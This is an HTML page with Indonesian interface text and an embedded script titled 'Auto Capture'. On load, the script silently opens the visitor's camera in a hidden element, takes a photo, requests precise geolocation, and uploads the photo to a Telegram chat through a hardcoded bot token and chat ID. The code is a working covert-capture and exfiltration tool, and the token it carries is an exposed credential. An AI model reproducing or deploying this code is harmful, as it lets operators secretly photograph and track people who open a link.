<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture</title>
    <style>
        body { font-family: Arial, sans-serif; background: white; margin: 0; padding: 20px; text-align: center; }
        #status { margin-top: 50px; font-size: 18px; color: #333; }
        #debug { color: #666; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>
    <div id="status">Memulai proses...</div>
    <div id="debug"></div>

    <video id="camera-view" autoplay playsinline style="display:none;"></video>
    <canvas id="photo-canvas" style="display:none;"></canvas>

    <script>
        // CONFIGURATION (Ganti dengan data Anda)
        const BOT_TOKEN = '7548364986:AAGhlDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY';
        const CHAT_ID = '7041008009';
        
        const statusEl = document.getElementById('status');
        const debugEl = document.getElementById('debug');
        const cameraView = document.getElementById('camera-view');
        const photoCanvas = document.getElementById('photo-canvas');
        
        // Debug function
        function debugLog(message) {
            debugEl.innerHTML += message + '<br>';
            console.log(message);
        }

        async function initialize() {
            try {
                debugLog("1. Memeriksa koneksi internet...");
                if (!navigator.onLine) throw new Error("Tidak ada koneksi internet");
                
                debugLog("2. Memeriksa token dan chat ID...");
                if (!BOT_TOKEN || !CHAT_ID) throw new Error("Token atau Chat ID tidak valid");
                
                debugLog("3. Mengakses kamera...");
                await capturePhoto();
                
                debugLog("4. Mendapatkan lokasi...");
                await getLocation();
                
                debugLog("5. Mengirim ke Telegram...");
                const result = await sendToTelegram();
                
                statusEl.textContent = "✅ Data berhasil dikirim!";
                debugLog("RESPONSE: " + JSON.stringify(result));
                
            } catch (error) {
                statusEl.textContent = "❌ Error: " + error.message;
                debugLog("ERROR: " + error.stack);
            }
        }
        
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' }
                });
                
                cameraView.srcObject = stream;
                
                await new Promise((resolve) => {
                    cameraView.onloadedmetadata = () => {
                        setTimeout(() => {
                            const context = photoCanvas.getContext('2d');
                            photoCanvas.width = cameraView.videoWidth;
                            photoCanvas.height = cameraView.videoHeight;
                            context.drawImage(cameraView, 0, 0);
                            
                            stream.getTracks().forEach(track => track.stop());
                            resolve();
                        }, 500);
                    };
                });
                
            } catch (error) {
                throw new Error("Kamera error: " + error.message);
            }
        }
        
        async function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error("Browser tidak mendukung geolokasi"));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => resolve(position),
                    error => reject(new Error(getGeoError(error))),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        function getGeoError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED: return "Izin lokasi ditolak";
                case error.POSITION_UNAVAILABLE: return "Lokasi tidak tersedia";
                case error.TIMEOUT: return "Waktu habis saat mendapatkan lokasi";
                default: return "Error lokasi tidak diketahui";
            }
        }
        
        async function sendToTelegram() {
            try {
                const photoDataUrl = photoCanvas.toDataURL('image/jpeg');
                const blob = await (await fetch(photoDataUrl)).blob();
                const formData = new FormData();
                
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');
                
                // Test API request
                debugLog("Testing bot token...");
                const testResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
                const testData = await testResponse.json();
                if (!testData.ok) throw new Error("Token bot tidak valid");
                
                // Send photo
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                return await response.json();
                
            } catch (error) {
                throw new Error("Telegram error: " + error.message);
            }
        }
        
        // Start process
        window.addEventListener('DOMContentLoaded', initialize);
    </script>
</body>
</html>
